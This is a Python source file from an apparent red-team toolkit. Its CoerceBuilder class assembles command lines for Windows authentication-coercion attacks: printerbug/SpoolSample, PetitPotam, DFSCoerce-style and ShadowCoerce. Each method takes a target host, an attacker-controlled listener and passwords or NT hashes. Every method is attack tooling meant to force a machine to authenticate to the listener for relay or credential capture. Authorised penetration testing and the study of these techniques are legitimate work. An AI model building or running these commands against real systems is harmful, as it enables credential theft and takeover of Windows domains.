from __future__ import annotations

from pydantic import SecretStr

from redstrike.builders._auth import extend_user_pass, secret_value


class CoerceBuilder:
    """Typed builder for authentication coercion primitives (MS-RPRN, MS-EFSR, MS-FSRVP, MS-DFSNM)."""

    def spoolsample(
        self,
        *,
        target: str,
        listener: str,
        username: str | None = None,
        password: str | SecretStr | None = None,
        nt_hash: str | SecretStr | None = None,
        domain: str | None = None,
        binary: str = "printerbug.py",
    ) -> list[str]:
        """Build MS-RPRN spoolss/printerbug coercion command."""
        if binary.lower().endswith("spoolsample.exe"):
            # Windows SpoolSample.exe <target> <listener>
            return [binary, target, listener]

        # Linux printerbug.py [domain/]username[:password]@target listener
        argv = [binary]
        if username:
            user_part = f"{domain}/{username}" if domain else username
            pw = secret_value(password)
            if pw:
                user_spec = f"{user_part}:{pw}@{target}"
            else:
                user_spec = f"{user_part}@{target}"
            argv.append(user_spec)
        else:
            argv.append(target)

        h = secret_value(nt_hash)
        if h:
            argv.extend(["-hashes", h if ":" in h else f":{h}"])

        argv.append(listener)
        return argv

    def petitpotam(
        self,
        *,
        target: str,
        listener: str,
        username: str,
        password: str | SecretStr | None = None,
        nt_hash: str | SecretStr | None = None,
        domain: str | None = None,
        dc_ip: str | None = None,
        pipe: str | None = None,
        binary: str = "petitpotam.py",
    ) -> list[str]:
        """Build MS-EFSR PetitPotam coercion command."""
        argv = [binary]
        argv = extend_user_pass(
            argv,
            username=username,
            password=password,
            nt_hash=nt_hash,
            domain=domain,
            user_flag="-u",
            pass_flag="-p",
            hash_flag="-hashes",
            domain_flag="-d",
        )
        if dc_ip:
            argv.extend(["-dc-ip", dc_ip])
        if pipe:
            argv.extend(["-pipe", pipe])
        argv.extend([listener, target])
        return argv

    def dfircoerce(
        self,
        *,
        target: str,
        listener: str,
        username: str,
        password: str | SecretStr | None = None,
        nt_hash: str | SecretStr | None = None,
        domain: str | None = None,
        method: str | None = None,
        binary: str = "dfircoerce.py",
    ) -> list[str]:
        """Build multi-protocol DFIRCoerce command (MS-EFSR, MS-FSRVP, MS-DFSNM)."""
        argv = [binary, "-t", target, "-l", listener]
        argv = extend_user_pass(
            argv,
            username=username,
            password=password,
            nt_hash=nt_hash,
            domain=domain,
            user_flag="-u",
            pass_flag="-p",
            hash_flag="-hashes",
            domain_flag="-d",
        )
        if method:
            argv.extend(["-m", method])
        return argv

    def shadowcoerce(
        self,
        *,
        target: str,
        listener: str,
        username: str,
        password: str | SecretStr | None = None,
        nt_hash: str | SecretStr | None = None,
        domain: str | None = None,
        binary: str = "shadowcoerce.py",
    ) -> list[str]:
        """Build MS-FSRVP ShadowCoerce command."""
        argv = [binary]
        argv = extend_user_pass(
            argv,
            username=username,
            password=password,
            nt_hash=nt_hash,
            domain=domain,
            user_flag="-u",
            pass_flag="-p",
            hash_flag="-hashes",
            domain_flag="-d",
        )
        argv.extend([listener, target])
        return argv
